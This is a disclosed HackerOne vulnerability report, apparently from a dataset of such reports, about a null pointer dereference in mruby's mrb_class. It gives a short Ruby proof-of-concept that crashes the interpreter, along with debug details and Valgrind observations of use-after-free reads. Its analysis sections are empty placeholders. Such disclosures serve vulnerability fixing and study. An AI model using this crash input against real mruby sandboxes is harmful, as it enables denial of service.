---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '215891'
original_report_id: '215891'
title: Null pointer dereference in mrb_class
weakness: NULL Pointer Dereference
team_handle: shopify-scripts
created_at: '2017-03-24T17:27:15.239Z'
disclosed_at: '2017-04-15T14:45:08.039Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 3
tags:
- hackerone
- null-pointer-dereference
---

# Null pointer dereference in mrb_class

## Metadata

- HackerOne Report ID: 215891
- Weakness: NULL Pointer Dereference
- Program: shopify-scripts
- Disclosed At: 2017-04-15T14:45:08.039Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

PoC
===
The following demonstrates a crash:

    if def class
      A
      ensure
        e rescue 0
      end
    end
    [].map.a

Debug info
==========
The crash happens due to a null pointer dereference in `mrb_class`, class.h:50.

    50├>    return mrb_obj_ptr(v)->c;
    
Valgrind shows several reads inside free'd blocks.


Test platform
=============
* Linux Mint 17.3 (Cinnamon 64-bit), built with gcc version 4.8.4 (Ubuntu 4.8.4-2ubuntu1~14.04.3

mruby SHA: 051e40c0493f2de332f5439e3230c9fe6958bf1a

Thank you,
Dinko Galetic
Denis Kasak

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
